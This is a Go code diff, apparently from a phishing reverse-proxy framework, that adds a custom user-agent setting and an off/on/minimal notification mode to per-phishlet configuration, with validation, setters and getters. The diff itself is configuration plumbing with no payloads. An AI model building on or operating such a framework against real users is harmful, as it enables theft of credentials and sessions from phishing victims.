@@ -41,6 +41,8 @@ type PhishletConfig struct {
 	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
 	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
 	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
+	CustomUA  string `mapstructure:"custom_ua" json:"custom_ua" yaml:"custom_ua"`
+	Notify    string `mapstructure:"notify" json:"notify" yaml:"notify"`
 }
 
 type ProxyConfig struct {
@@ -199,8 +201,10 @@ func (c *Config) PhishletConfig(site string) *PhishletConfig {
 		o := &PhishletConfig{
 			Hostname:  "",
 			UnauthUrl: "",
+			CustomUA:  "",
 			Enabled:   false,
 			Visible:   true,
+			Notify:    "off",
 		}
 		c.phishletConfig[site] = o
 		return o
@@ -255,6 +259,51 @@ func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
 	}
 	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
 	c.PhishletConfig(site).UnauthUrl = _url
+	c.SavePhishlets()
+	return true
+}
+
+func (c *Config) SetSiteCustomUa(site string, custom_ua string) bool {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		log.Error("%v", err)
+		return false
+	}
+	if pl.isTemplate {
+		log.Error("phishlet is a template - can't set custom user-agent")
+		return false
+	}
+	if custom_ua != "" {
+		if len(custom_ua) > 256 {
+			log.Error("user-agent string is too long")
+			return false
+		}
+	}
+	log.Info("phishlet '%s' custom_ua set to: %s", site, custom_ua)
+	c.PhishletConfig(site).CustomUA = custom_ua
+	c.SavePhishlets()
+	return true
+}
+
+func (c *Config) SetSiteNotify(site string, mode string) bool {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		log.Error("%v", err)
+		return false
+	}
+	if pl.isTemplate {
+		log.Error("phishlet is a template - can't set notify option")
+		return false
+	}
+
+	// 'mode' must be one of "off", "on", or "minimal"
+	if mode != "off" && mode != "on" && mode != "minimal" {
+		log.Error("invalid notify mode: %s (valid: off|on|minimal)", mode)
+		return false
+	}
+
+	log.Info("phishlet '%s' notify set to: %s", site, mode)
+	c.PhishletConfig(site).Notify = mode
 	c.SavePhishlets()
 	return true
 }
@@ -778,6 +827,24 @@ func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
 		return o.UnauthUrl, ok
 	}
 	return "", false
+}
+
+func (c *Config) GetSiteCustomUa(site string) (string, bool) {
+	if o, ok := c.phishletConfig[site]; ok {
+		return o.CustomUA, ok
+	}
+	return "", false
+}
+
+func (c *Config) GetSiteNotifyMode(site string) string {
+	return c.PhishletConfig(site).Notify
+}
+
+func (c *Config) IsSiteNotifyModeMinimal(site string) bool {
+	if c.GetSiteNotifyMode(site) == "minimal" {
+		return true
+	}
+	return false
 }
 
 func (c *Config) GetBaseDomain() string {
